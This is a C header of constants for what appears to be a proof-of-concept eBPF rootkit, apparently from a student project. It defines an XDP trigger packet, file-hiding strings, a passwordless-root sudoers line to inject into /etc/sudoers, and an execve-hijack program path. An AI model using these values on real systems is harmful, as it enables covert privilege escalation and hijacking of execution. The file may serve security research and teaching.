#ifndef __CONSTANTS_H
#define __CONSTANTS_H

//XDP
#define SECRET_PACKET_PAYLOAD "XDP_PoC_0"
#define SECRET_PACKET_DEST_PORT 9000
#define SUBSTITUTION_NEW_PAYLOAD "The previous message has been hidden ;)"


//FS
#define STRING_FS_HIDE "This won't be seen"
#define STRING_FS_OVERWRITE "That is now hidden"

#define STRING_FS_SUDO_TASK "sudo"
#define STRING_FS_SUDO_TASK_LEN 5
#define STRING_FS_SUDOERS_FILE "/etc/sudoers"
#define STRING_FS_SUDOERS_FILE_LEN 13
#define STRING_FS_SUDOERS_ENTRY "osboxes ALL=(ALL:ALL) NOPASSWD:ALL #"
#define STRING_FS_SUDOERS_ENTRY_LEN 37

//EXECUTION HIJACKING
#define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijack\0"
#define EXEC_HIJACK_ACTIVE_TEMP 0

#define TASK_COMM_NAME_RESTRICT_HIJACK "bash"
#define TASK_COMM_RESTRICT_HIJACK_ACTIVE 1

#endif